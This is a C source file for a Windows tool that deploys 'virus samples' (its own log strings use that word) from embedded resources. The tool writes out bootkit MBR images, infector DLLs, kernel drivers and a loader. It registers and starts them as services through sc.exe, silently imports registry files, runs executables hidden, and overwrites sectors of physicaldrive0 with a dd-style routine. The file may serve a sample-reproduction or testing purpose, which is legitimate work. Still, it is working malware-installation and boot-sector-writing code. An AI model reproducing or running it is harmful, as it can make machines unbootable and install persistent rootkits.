#include "virus.h"
#include "tinylog.h"
#include <string.h>
#include <stdio.h>
#include <Windows.h>
#include <Shlwapi.h>
#include "tinystr.h"
#include "./../virus/resource.h"
#include "tinyargs.h"
#include "md5.h"

#define max_buf_len 512

#define check_mbr_bin L"c:\\checkmbr.bin"

#define physical_drive_0 L"\\\\.\\physicaldrive0"

/* 这里可以优化一下，L"IDR_XXXX" 可以find resource */
wchar_t* idr_name_index[] = {
	L"7ffecbfb.sys",
	L"anyun2mbr.bin",
	L"hqbzrnsjo.sys",
	L"infect_x64.dll",
	L"infect_x64_win10.dll",
	L"infect_x86.dll",
	L"infect_x86_win10.dll",
	L"Loader.exe",
	L"MpKslIrtn.reg",
	L"MpKslKnbZi.dll",
	L"netgjo.sys",
	L"tqkqjm.sys",
	L"yinhunmbr.bin",
	L"yinhunmbr2.bin",
};

#define notify_log(msg) do { \
		if (notify && notify_data && msg) { \
			args->p1 = msg; \
			notify(notify_data); \
		} \
	} while (0)

extern char* copy_resource(int id, wchar_t* type, int* length);

void log_last_error(step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	LPVOID lpMsgBuf = 0;
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPWSTR)&lpMsgBuf, 0, NULL);

	notify_log(wcs_format(buf, max_buf_len, (LPWSTR)lpMsgBuf));
	LocalFree(lpMsgBuf);
}

int write_file(wchar_t* file, char* buffer, int length, step_notify_func notify, void* notify_data)
{
	FILE* fp = 0;
	int ret = 0;
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	
	do
	{
		fp = _wfopen(file, L"wb");
		if (!fp)
		{
			notify_log(wcs_format(buf, max_buf_len, L"写方式打开文件失败 %s", file));
			log_last_error(notify, notify_data);
			break;
		}
		
		if (!fwrite(buffer, length, 1, fp))
		{
			notify_log(wcs_format(buf, max_buf_len, L"写文件失败 %s len = %d", file, length));
			log_last_error(notify, notify_data);
			break;
		}
		
		fclose(fp);
		
		ret = 1;
		
	} while (0);
	
	if (fp)
	{
		fclose(fp);
		fp = 0;
	}
	
	return ret;
}

void create_process2(wchar_t* cmd_str, int show, step_notify_func notify, void* notify_data)
{
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInfo;
	BOOL bRet = FALSE;
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;	// 使用显示窗口和标准句柄
	startupInfo.wShowWindow = show ? SW_SHOW : SW_HIDE;		// 隐藏控制台窗口	
	ZeroMemory(&processInfo, sizeof(processInfo));
	// 如果cmdstr指向不可修改（const）内存，会访问违例，规避
	// 如lpCmdStr是LPTSTR cmd = _T("ping 127.0.0.1")
	bRet = CreateProcess(
		NULL,		// 不在此指定可执行文件的文件名  
		cmd_str,		// 命令行参数，不能是const，否则会crash！
		NULL,		// 默认进程安全性  
		NULL,		// 默认进程安全性  
		TRUE,		// 指定当前进程内句柄可以被子进程继承  
		0,			// 不为新进程创建一个新的控制台窗口  
		NULL,		// 使用本进程的环境变量  
		NULL,		// 使用本进程的驱动器和目录  
		&startupInfo,
		&processInfo);
	if (bRet)
	{
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
	else
	{
		notify_log(wcs_format(buf, max_buf_len, L"创建子进程失败！"));
		log_last_error(notify, notify_data);
	}
}

void create_process(wchar_t* cmd_str, step_notify_func notify, void* notify_data)
{
	const INT BUFF_SIZE = 1024;
	const INT MAX_TIME = 10;//ms，超时时间短一些也无所谓，超时总再等待

	BOOL bRet = FALSE;
	HANDLE					hReadHandle = NULL;
	HANDLE					hWriteHandle = NULL;
	DWORD dwBytesRead = 0;
	char *pBuffer = 0;
	DWORD dwWaitRet = ERROR_TIMEOUT;
	SECURITY_ATTRIBUTES		securityAttributes;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInfo;
	DWORD dwRead = 0;
	DWORD dwAvail = 0;
	DWORD dwRemain = 0;
	wchar_t* wcs = 0;
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;

	do
	{
		ZeroMemory(&securityAttributes, sizeof(securityAttributes));
		securityAttributes.nLength = sizeof(securityAttributes);
		securityAttributes.bInheritHandle = TRUE;
		securityAttributes.lpSecurityDescriptor = NULL;
		bRet = CreatePipe(
			&hReadHandle,
			&hWriteHandle,
			&securityAttributes,
			0);	// 管道预留大小（默认，or操作系统会给一个相近的值，不是准确的）
		if (!bRet)
		{
			notify_log(wcs_format(buf, max_buf_len, L"创建管道失败！"));
			log_last_error(notify, notify_data);
			break;
		}

		/*
		* 创建一个子进程，标准输出和标准错误输出到管道
		*/
		ZeroMemory(&startupInfo, sizeof(startupInfo));
		startupInfo.cb = sizeof(startupInfo);
		startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;	// 使用显示窗口和标准句柄
		startupInfo.hStdOutput = hWriteHandle;	// 输出至管道
		startupInfo.hStdError = hWriteHandle;	// 输出至管道
		startupInfo.wShowWindow = SW_HIDE;		// 隐藏控制台窗口	
		ZeroMemory(&processInfo, sizeof(processInfo));
		// 如果cmdstr指向不可修改（const）内存，会访问违例，规避
		// 如lpCmdStr是LPTSTR cmd = _T("ping 127.0.0.1")
		bRet = CreateProcess(
			NULL,		// 不在此指定可执行文件的文件名  
			cmd_str,		// 命令行参数，不能是const，否则会crash！
			NULL,		// 默认进程安全性  
			NULL,		// 默认进程安全性  
			TRUE,		// 指定当前进程内句柄可以被子进程继承  
			0,			// 不为新进程创建一个新的控制台窗口  
			NULL,		// 使用本进程的环境变量  
			NULL,		// 使用本进程的驱动器和目录  
			&startupInfo,
			&processInfo);
		/*
		* 创建子进程成功，读子进程的输出和错误，并返回
		*/
		if (bRet)
		{
			dwBytesRead = 0;
			dwWaitRet = ERROR_TIMEOUT;
			do
			{
				// 给子进程一点时间准备管道，如果等到它死则退出
				dwWaitRet = WaitForSingleObject(processInfo.hProcess, MAX_TIME);

				// 获取管道内可读内容大小
				dwRead = 0;
				dwAvail = 0;
				dwRemain = 0;
				bRet = PeekNamedPipe(hReadHandle, NULL, 0, &dwRead, &dwAvail, &dwRemain);
				if (bRet && (dwAvail != 0))
				{
					pBuffer = (char*)safe_malloc(dwAvail + 1);
					ZeroMemory(pBuffer, dwAvail);

					// 如果管道内有内容，则读取全部
					bRet = ReadFile(
						hReadHandle,
						pBuffer,
						dwAvail,
						&dwBytesRead,
						NULL);

					pBuffer[dwBytesRead] = '\0';

					wcs = str_to_wcs(pBuffer, -1, encoding_ansi);
					if (wcs)
					{
						notify_log(wcs_format(buf, max_buf_len, wcs));
						free(wcs);
						wcs = 0;
					}

					free(pBuffer);
					pBuffer = 0;
				}

				//
				// “退出读”唯一条件是子进程结束
				//
			} while (dwWaitRet == WAIT_TIMEOUT);

			// 释放句柄
			CloseHandle(processInfo.hProcess);
			CloseHandle(processInfo.hThread);
			break;
		}
		else
		{
			notify_log(wcs_format(buf, max_buf_len, L"创建子进程失败！"));
			log_last_error(notify,notify_data);
			break;
		}
	} while (0);

	/*
	* 释放句柄
	*/
	if (hReadHandle)
	{
		CloseHandle(hReadHandle);
		hReadHandle = NULL;
	}
	if (hWriteHandle)
	{
		CloseHandle(hWriteHandle);
		hWriteHandle = NULL;
	}
}

#define SECTOR_BYTE 512

void PrintSector(PBYTE pBytes, step_notify_func notify, void* notify_data)
{
	#define print_len 20140
	wchar_t buf[print_len] = L"======================================================\r\n";
	args_t* args = (args_t*)notify_data;

	for (int j = 0; j < 32; j++)
	{
		swprintf_s(buf, print_len, L"%s%04x | ", buf, 16 * j);
		for (int i = j * 16; i < j * 16 + 16; i++)
		{
			swprintf_s(buf, print_len, L"%s%02x ", buf, pBytes[i]);
			if (i % 16 == 7)
			{
				wcscat_s(buf, print_len, L" ");
			}
		}
		wcscat_s(buf, print_len, L"\r\n");
	}
	notify_log(buf);
}

int WriteSector(HANDLE hFile, DWORD dwSectorNo, PBYTE pBytes, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	DWORD dwErr = 0;
	DWORD dwWritten;

	dwErr = SetFilePointer(hFile, dwSectorNo*SECTOR_BYTE, NULL, FILE_BEGIN);

	if (dwErr == INVALID_SET_FILE_POINTER)
	{
		notify_log(wcs_format(buf, max_buf_len, L"SetFilePointer失败"));
		log_last_error(notify,notify_data);
		return 0;
	}
	dwErr = WriteFile(hFile, pBytes, SECTOR_BYTE, &dwWritten, NULL);
	if ((dwErr == FALSE) || (dwWritten != SECTOR_BYTE))
	{
		notify_log(wcs_format(buf, max_buf_len, L"WriteFile失败"));
		log_last_error(notify,notify_data);
		return 0;
	}
	
	return 1;
}

int ReadSector(HANDLE hFile, DWORD dwSectorNo, PBYTE pBytes, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	DWORD dwReadSize;
	DWORD dwErr = 0;
	dwErr = SetFilePointer(hFile, dwSectorNo*SECTOR_BYTE, NULL, FILE_BEGIN);
	if (INVALID_SET_FILE_POINTER == dwErr)
	{
		notify_log(wcs_format(buf, max_buf_len, L"SetFilePointer失败"));
		log_last_error(notify,notify_data);
		return 0;
	}
	dwErr = ReadFile(hFile, pBytes, SECTOR_BYTE, &dwReadSize, NULL);
	if (dwErr == FALSE)
	{
		notify_log(wcs_format(buf, max_buf_len, L"ReadFile失败"));
		log_last_error(notify,notify_data);
		return 0;
	}
	return 1;
}

int string_to_int(wchar_t* str)
{
	if (!str)
		return 0;

	if (L'-' == str[0])
		return -1;

	if (0 == wcsncmp(L"0x", str, 2))
		return wcstol(&str[2], 0, 16);
	
	return wcstol(str, 0, 10);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int release(wchar_t* file, wchar_t* to, int id, int del, step_notify_func notify, void* notify_data)
{
	char* buffer = 0;
	int len = 0;
	int i = 0;
	int ret = 0;
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;

	do
	{
		if (!file || !to)
		{
			notify_log(L"参数错误");
			break;
		}

		notify_log(wcs_format(buf, max_buf_len, L"release %s to %s", file, to));

		if (PathFileExists(to))
		{
			notify_log(L"已存在");
			ret = 1;
			break;
		}

		/* delete after reboot */
		if (del)
			MoveFileEx(to, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

		//notify_log(wcs_format(buf, max_buf_len, L"release %s to %s", file, to));

		if (id == 0)
		{
			for (i = 0; i < sizeof(idr_name_index) / sizeof(idr_name_index[0]); i++)
			{
				if (0 == wcscmp(idr_name_index[i], file))
					break;
			}
			id = IDR_VIRUS1 + i;
		}

		buffer = copy_resource(id, L"virus", &len);

		if (!buffer || !len)
		{
			notify_log(wcs_format(buf, max_buf_len, L"获取资源失败 idr = %d ", IDR_VIRUS1 + i));
			break;
		}

		if (PathFileExists(to))
		{
			if (!DeleteFile(to))
			{
				notify_log(wcs_format(buf, max_buf_len, L"文件已存在，无法删除 %s ", to));
				break;
			}
		}

		if (!write_file(to, buffer, len, notify, notify_data))
		{
			notify_log(L"请重启试试（最好是纯净环境）");
			break;
		}

		if (!PathFileExists(to))
		{
			notify_log(L"文件不存在");
			break;
		}

		notify_log(L"done");

		ret = 1;

	} while (0);

	free(buffer);

	

	return ret;
}

#define sc_exe L"c:\\windows\\system32\\sc.exe"

int regsrv(wchar_t* name, wchar_t* binPath, wchar_t* start, wchar_t* type, step_notify_func notify, void* notify_data)
{
	wchar_t cmd[MAX_PATH] = { 0 };
	args_t* args = (args_t*)notify_data;
	int ret = 0;

	

	do
	{
		if (!name || !binPath || !start || !type)
		{
			notify_log(L"参数错误");
			break;
		}

		//notify_log(wcs_format(buf, max_buf_len, L"regsv %s at \"%s\" start(%s) type(%s)", name, binPath, start, type));

		wcs_format(cmd, MAX_PATH, L"\"%s\" create %s binPath= \"%s\" start= %s type= %s",
			sc_exe, name, binPath, start, type);

		notify_log(cmd);

		create_process(cmd, notify, notify_data);

		notify_log(L"done");

		ret = 1;

	} while (0);

	return ret;
}

int runsrv(wchar_t* name, step_notify_func notify, void* notify_data)
{
	wchar_t cmd[MAX_PATH] = { 0 };
	args_t* args = (args_t*)notify_data;
	int ret = 0;

	do
	{
		if (!name)
		{
			notify_log(L"参数错误");
			break;
		}

		//notify_log(wcs_format(buf, max_buf_len, L"runsrv %s", name));

		wcs_format(cmd, MAX_PATH, L"\"%s\" start %s", sc_exe, name);

		notify_log(cmd);

		create_process(cmd, notify, notify_data);
		
		notify_log(L"done");

		ret = 1;

	} while (0);

	

	return ret;
}

int reg(wchar_t* file, step_notify_func notify, void* notify_data)
{
	wchar_t cmd[MAX_PATH] = { 0 };
	args_t* args = (args_t*)notify_data;
	int ret = 0;

	do
	{
		if (!file)
		{
			notify_log(L"参数错误");
			break;
		}

		//notify_log(wcs_format(buf, max_buf_len, L"reg %s", file));

		wcs_format(cmd, MAX_PATH, L"regedit.exe /S \"%s\"", file);

		notify_log(cmd);

		create_process(cmd, notify, notify_data);

		notify_log(L"done");

		ret = 1;

	} while (0);
	
	return ret;
}

int runexe(wchar_t* file, wchar_t* arg_str, int show, step_notify_func notify, void* notify_data)
{
	wchar_t cmd[MAX_PATH] = { 0 };
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	int ret = 0;

	do
	{
		if (!file)
		{
			notify_log(L"参数错误");
			break;
		}

		notify_log(wcs_format(buf, max_buf_len, L"runexe %s", file));

		if (arg_str)
			wcs_format(cmd, MAX_PATH, L"\"%s\" \"%s\"", file, arg_str);
		else
			wcs_format(cmd, MAX_PATH, L"\"%s\"", file);

//		notify_log(cmd);

		create_process2(cmd, show, notify, notify_data);

		notify_log(L"done");

		ret = 1;
	} while (0);

	return ret;
}

int bakmbr(wchar_t* file, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	HANDLE hFileIn = INVALID_HANDLE_VALUE;
	HANDLE hFileOu = INVALID_HANDLE_VALUE;
	unsigned char bytes[SECTOR_BYTE];
	int ret = 0;

	

	do
	{
		if (!file)
		{
			notify_log(L"参数错误");
			break;
		}

		notify_log(wcs_format(buf, max_buf_len, L"bakmbr %s", file));

		/* delete after reboot */
		MoveFileEx(file, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

		hFileIn = CreateFile(physical_drive_0, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFileIn == INVALID_HANDLE_VALUE)
		{
			notify_log(wcs_format(buf, max_buf_len, L"打开文件失败 %s", physical_drive_0));
			log_last_error(notify, notify_data);
			notify_log(L"请重启试试（最好是纯净环境）");
			break;
		}

		hFileOu = CreateFile(file, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFileOu == INVALID_HANDLE_VALUE)
		{
			notify_log(wcs_format(buf, max_buf_len, L"打开文件失败 %s", file));
			log_last_error(notify, notify_data);
			notify_log(L"请重启试试（最好是纯净环境）");
			break;
		}

		if (!ReadSector(hFileIn, 0, bytes, notify, notify_data) || !WriteSector(hFileOu, 0, bytes, notify, notify_data))
		{
			notify_log(L"请重启试试（最好是纯净环境）");
			break;
		}
		
		notify_log(L"done");

		ret = 1;
	} while (0);

	if (INVALID_HANDLE_VALUE != hFileIn)
		CloseHandle(hFileIn);

	if (INVALID_HANDLE_VALUE != hFileOu)
		CloseHandle(hFileOu);

	

	return ret;
}


int checksys(wchar_t* os, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	int ret = 0;
	OSVERSIONINFO osVer = { 0 };
	int major = 0;
	int minor = 0;

	do
	{
		if (!os)
		{
			notify_log(L"参数错误");
			break;
		}
		
		notify_log(wcs_format(buf, max_buf_len, L"checksys %s", os));


		osVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if (!GetVersionEx((OSVERSIONINFO*)&osVer))
		{
			notify_log(L"获取系统版本错误");
			log_last_error(notify, notify_data);
		}

		major = osVer.dwMajorVersion;
		minor = osVer.dwMinorVersion;		

		if (major == 5 && minor == 1)
		{
			notify_log(L"当前系统: xp");
			if (-1 == wcs_find_sub_from(os, L"xp", 0))
			{
				notify_log(L"所选择病毒样本在xp系统上无法运行");
				break;
			}
		}
		else if (major == 6 && minor == 1)
		{
			if (is_x64_system())
			{
				notify_log(L"当前系统: win7 64");
				if (-1 == wcs_find_sub_from(os, L"win764", 0))
				{
					notify_log(L"所选择病毒样本在win7 64位系统上无法运行");
					break;
				}
			}
			else
			{
				notify_log(L"当前系统: win7 32");
				if (-1 == wcs_find_sub_from(os, L"win732", 0))
				{
					notify_log(L"所选择病毒样本在win7 32位系统上无法运行");
					break;
				}
			}
		}
		else
		{
			notify_log(wcs_format(buf, max_buf_len, L"不支持的系统 %d.%d", major, minor));
			break;
		}
		
		notify_log(L"done");

		ret = 1;

	} while (0);

	return ret;
}

int checkmbr(wchar_t* file, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	wchar_t md5a[33];
	wchar_t md5b[33];
	wchar_t* p = 0;
	int ret = 0;

	do
	{
		if (!file)
		{
			notify_log(L"参数错误");
			break;
		}

		notify_log(wcs_format(buf, max_buf_len, L"checkmbr %s", file));

		if (!PathFileExists(file))
		{
			ret = 1;
			break;
		}

		if (!bakmbr(check_mbr_bin, notify, notify_data))
		{
			notify_log(L"无法备份mbr");
			ret = 0;
			break;
		}

		p = md5_compute(check_mbr_bin, 0, 0);
		if (!p)
		{
			notify_log(wcs_format(buf, max_buf_len, L"无法计算md5 %s", check_mbr_bin));
			ret = 0;
			break;
		}
		wcscpy(md5a, p);
		notify_log(wcs_format(buf, max_buf_len, L"当前mbr的md5 %s", md5a));

		p = md5_compute(file, 0, 0);
		if (!p)
		{
			notify_log(wcs_format(buf, max_buf_len, L"无法计算md5 %s", file));
			ret = 0;
			break;
		}
		wcscpy(md5b, p);
		notify_log(wcs_format(buf, max_buf_len, L"备份mbr的md5 %s", md5b));

		if (wcscmp(md5a, md5b))
		{
			notify_log(L"可能已经修改过mbr，再次修改会造成系统无法引导！");
			ret = 0;
			break;
		}

		notify_log(L"done");

		ret = 1;

	} while (0);

	
	
	return ret;
}

int dd(wchar_t* _if, wchar_t* skip, wchar_t* of, wchar_t* seek, wchar_t* bs, wchar_t* count, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	HANDLE hFileIn = INVALID_HANDLE_VALUE;
	HANDLE hFileOu = INVALID_HANDLE_VALUE;
	int _count = 0;
	int _bs = 0;
	int _skip = 0;
	int _seek = 0;
	unsigned char bytes[SECTOR_BYTE];
	unsigned char bytes_temp[SECTOR_BYTE];
	int i = 0;
	int rest = 0;
	unsigned long len_high = 0, len_low = 0;
	int ret = 0;

	do
	{
		if (!_if || !skip || !of || !seek || !bs || !count)
		{
			notify_log(L"参数错误");
			break;
		}

		notify_log(wcs_format(buf, max_buf_len, L"dd %s(skip %s) to %s(seek %s) bs(%s) count(%s)", _if, skip, of, seek, bs, count));

		_skip = string_to_int(skip);
		_seek = string_to_int(seek);
		_bs = string_to_int(bs);
		_count = string_to_int(count);

		if (!_bs || !_count || _bs > 0x200)
		{
			notify_log(wcs_format(buf, max_buf_len, L"bs = %d, or count = %d 不合法", _bs, _count));
			break;
		}

		/* if bs != 0x200, then _count must be 1 */
		if (_bs != 0x200 && _count != 1)
		{
			notify_log(wcs_format(buf, max_buf_len, L"if bs != 0x200, then _count must be 1. _bs = %d, _count = %d", _bs, _count));
			break;
		}

		/* if must not be equal to of */
		if (0 == wcscmp(_if, of))
		{
			notify_log(wcs_format(buf, max_buf_len, L"if == of 输入和输出设备不能相同！ %s", _if));
			break;
		}

		hFileIn = CreateFile(_if, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFileIn == INVALID_HANDLE_VALUE)
		{
			notify_log(wcs_format(buf, max_buf_len, L"打开文件失败 %s", _if));
			log_last_error(notify, notify_data);
			notify_log(L"请重启试试（最好是纯净环境）");
			break;
		}

		hFileOu = CreateFile(of, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFileOu == INVALID_HANDLE_VALUE)
		{
			notify_log(wcs_format(buf, max_buf_len, L"打开文件失败 %s", of));
			log_last_error(notify, notify_data);
			notify_log(L"请重启试试（最好是纯净环境）");
			break;
		}

		/*  这里实现时不严谨的，出问题再优化！！ */
		if (_bs == 0x200)
		{
			len_low = GetFileSize(hFileIn, &len_high);
			if (len_high)
			{
				notify_log(wcs_format(buf, max_buf_len, L"输入文件不可预期得大 %ul.%ul", len_high, len_low));
				break;
			}

			if (_count == -1)
				_count = len_low / 0x200;

			rest = len_low - _count * SECTOR_BYTE;

			for (i = 0; i < _count; i++)
			{
				if (!ReadSector(hFileIn, _skip + i, bytes, notify, notify_data) || !WriteSector(hFileOu, _seek + i, bytes, notify, notify_data))
				{
					notify_log(L"请重启试试（最好是纯净环境）");
					break;
				}
			}

			if (rest && _count == -1)
			{
				notify_log(wcs_format(buf, max_buf_len, L"最后多余%d字节", rest));

				if (!ReadSector(hFileIn, _skip + i, bytes, notify, notify_data) || !ReadSector(hFileOu, _seek + i, bytes_temp, notify, notify_data))
				{
					notify_log(L"请重启试试（最好是纯净环境）");
					break;
				}
					

				memcpy(bytes_temp, bytes, rest);

				//PrintSector(bytes, notify, notify_data);

				if (!WriteSector(hFileOu, _seek + i, bytes_temp, notify, notify_data))
				{
					notify_log(L"请重启试试（最好是纯净环境）");
					break;
				}
			}
		}
		else
		{
			/* assert skip = 0 */
			if (_skip != 0 || _seek != 0 || _count != 1)
			{
				notify_log(L"bs 不等于0x200时，skip和seek必须是0，count必须是1");
				break;
			}

			if (!ReadSector(hFileIn, 0, bytes, notify, notify_data) || !ReadSector(hFileOu, 0, bytes_temp, notify, notify_data))
			{
				notify_log(L"请重启试试（最好是纯净环境）");
				break;
			}

			memcpy(bytes_temp, bytes, _bs);

			if (!WriteSector(hFileOu, 0, bytes_temp, notify, notify_data))
			{
				notify_log(L"请重启试试（最好是纯净环境）");
				break;
			}
		}

		ret = 1;
		notify_log(L"done");

	} while (0);
	
	if (INVALID_HANDLE_VALUE != hFileIn)
		CloseHandle(hFileIn);

	if (INVALID_HANDLE_VALUE != hFileOu)
		CloseHandle(hFileOu);

	return ret;
}

int msgbox(wchar_t* title, wchar_t* text, step_notify_func notify, void* notify_data)
{
	HWND hwnd = NULL;
	int ret = 0;
	args_t* args = (args_t*)notify_data;

	/*if (args)
		hwnd = ui_get_hwnd(args->p0);*/

	ret = MessageBox(hwnd, text, title, MB_OKCANCEL | MB_ICONWARNING);
	if (ret == IDOK)
	{
		notify_log(L"已确认");
		return 1;
	}

	notify_log(L"已取消");
	return 0;
}

int do_step(xml_element* element, step_notify_func notify, void* notify_data)
{
	wchar_t buf[max_buf_len];
	args_t* args = (args_t*)notify_data;
	wchar_t* file = 0;
	wchar_t* to = 0;
	wchar_t* _if = 0;
	wchar_t* temp = L"%temp%";
	int len = wcslen(temp);

	wchar_t file_buf[MAX_PATH];
	wchar_t to_buf[MAX_PATH];
	wchar_t _if_buf[MAX_PATH];
	wchar_t temp_buf[MAX_PATH];

	if (!element || !element->name)
		return 0;

	notify_log(L">>>>");

	if (!GetTempPath(MAX_PATH, temp_buf))
	{
		notify_log(L"获取%temp%目录失败");
		return 0;
	}

	file = xml_query_attribute(element, "file");
	to = xml_query_attribute(element, "to");
	_if = xml_query_attribute(element, "if");

	if (file && 0 == wcsncmp(temp, file, len))
	{
		wcs_format(file_buf, MAX_PATH, L"%s%s", temp_buf, &file[len]);
		file = file_buf;
	}
	if (to && 0 == wcsncmp(temp, to, len))
	{
		wcs_format(to_buf, MAX_PATH, L"%s%s", temp_buf, &to[len]);
		to = to_buf;
	}
	if (_if && 0 == wcsncmp(temp, _if, len))
	{
		wcs_format(_if_buf, MAX_PATH, L"%s%s", temp_buf, &_if[len]);
		_if = _if_buf;
	}

	if (0 == strcmp("release", element->name))
		return release(file, to, 0, 0, notify, notify_data);
	else if (0 == strcmp("checksys", element->name))
		return checksys(xml_query_attribute(element, "os"), notify, notify_data);
	else if (0 == strcmp("msgbox", element->name))
		return msgbox(xml_query_attribute(element, "title"), xml_query_attribute(element, "text"), notify, notify_data);
	else if (0 == strcmp("regsrv", element->name))
		return regsrv(xml_query_attribute(element, "name"), 
			xml_query_attribute(element, "binPath"), 
			xml_query_attribute(element, "start"), 
			xml_query_attribute(element, "type"), notify, notify_data);
	else if (0 == strcmp("runsrv", element->name))
		return runsrv(xml_query_attribute(element, "name"), notify, notify_data);
	else if (0 == strcmp("reg", element->name))
		return reg(file, notify, notify_data);
	else if (0 == strcmp("runexe", element->name))
		return runexe(file, 0, 0, notify, notify_data);
	else if (0 == strcmp("bakmbr", element->name))
		return bakmbr(file, notify, notify_data);
	else if (0 == strcmp("checkmbr", element->name))
		return checkmbr(file, notify, notify_data);
	else if (0 == strcmp("dd", element->name))
		return dd(_if
			, xml_query_attribute(element, "skip")
			, xml_query_attribute(element, "of")
			, xml_query_attribute(element, "seek")
			, xml_query_attribute(element, "bs")
			, xml_query_attribute(element, "count")
			, notify, notify_data);

	notify_log(wcs_format(buf, max_buf_len, L"非法操作%s", element->name));
	return 0;
}